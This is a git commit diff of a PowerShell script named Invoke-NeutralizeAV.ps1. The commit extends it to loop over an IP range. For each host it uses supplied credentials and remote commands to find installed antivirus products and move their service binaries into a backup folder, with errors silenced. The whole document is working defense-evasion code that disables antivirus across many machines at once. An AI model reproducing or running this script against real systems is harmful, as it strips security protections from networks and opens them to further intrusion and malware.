0439c47fe1aa9e68763ec56886db16d77b08ab3e
Curtis Brazzell <curtbraz@gmail.com>
2018-08-11 23:14:54 -0400

    Update Invoke-NeutralizeAV.ps1
    Added IP Range

--- Invoke-NeutralizeAV.ps1
+++ Invoke-NeutralizeAV.ps1
@@ -1,5 +1,6 @@
-# Input for Target & Credentials
-$Target = Read-Host -Prompt 'Enter a Single Hostname or IP..'
+# Input for Target(s) & Credentials
+$StartIP = Read-Host -Prompt 'Enter Start of IP Range..'
+$EndIP = Read-Host -Prompt 'Enter End of IP Range.. (Same as Start if Single Host)'
 $username = Read-Host -Prompt 'Enter Username'
 $password = Read-Host -Prompt 'Enter Password' 
 $password = ConvertTo-SecureString $password -AsPlainText -Force
@@ -8,24 +9,49 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# Query Host for Installed AV Products and Get Service Binary Location
-Write-Host "Getting a List of Installed AV Products.."
+# Get IP Range (Function Borrowed From Dr. Tobias Weltner, MVP PowerShell)
+    $ip1 = ([System.Net.IPAddress]$StartIP).GetAddressBytes()
+    [Array]::Reverse($ip1)
+    $ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
+    $ip2 = ([System.Net.IPAddress]$EndIP).GetAddressBytes()
+    [Array]::Reverse($ip2)
+    $ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
+    for ($x = $ip1; $x -le $ip2; $x++)
+    {
+        $ip = ([System.Net.IPAddress]$x).GetAddressBytes()
+        [Array]::Reverse($ip)
+        $Target = $ip -join '.'
 
-$AVServices = Invoke-Command -ComputerName $Target -ScriptBlock {Get-WMIObject AntiVirusProduct -namespace root\securitycenter2 | Select-Object pathToSignedReportingExe} -credential $cred
+$AVName = ""
+
+# Query Host for Installed AV Products and Get Service Binary Location
+$AVServices = Invoke-Command -ComputerName $Target -ScriptBlock {Get-WMIObject AntiVirusProduct -namespace root\securitycenter2} -credential $cred
+
+# Start an Array for Multiple Results
+#$arraylist = New-Object System.Collections.Arraylist
 
 # Start Loop in Case of More than One AV Solution
 foreach ($i in $AVServices){
 
 $SvcPath = $i | foreach { $_.pathToSignedReportingExe }
+$AVName = $i | foreach { $_.displayName }
 
 $SvcDirectory = Split-Path -Path $SvcPath
+
+if (-not ([string]::IsNullOrEmpty($AVName)))
+{
+Write-Host "Found $AVName on $Target.. Attempting Neutralization.."
+}
 
 # Create Backup Directory
 Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0]} -credential $cred -ArgumentList $SvcDirectory"BACKUP"
 
 # Move Service Files to "BACKUP" in Parent Directory
-Write-Host "Moving AV Service Binaries from $SvcDirectory to $SvcDirectory"BACKUP""
+Write-Host "Moving AV Service Binaries from $SvcDirectory to $SvcDirectory"BACKUP" on $Target"
 
 Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "\*") -Destination ($args[0] + "BACKUP\") -Force} -credential $cred -ArgumentList $SvcDirectory
 
 }
+
+
+    }
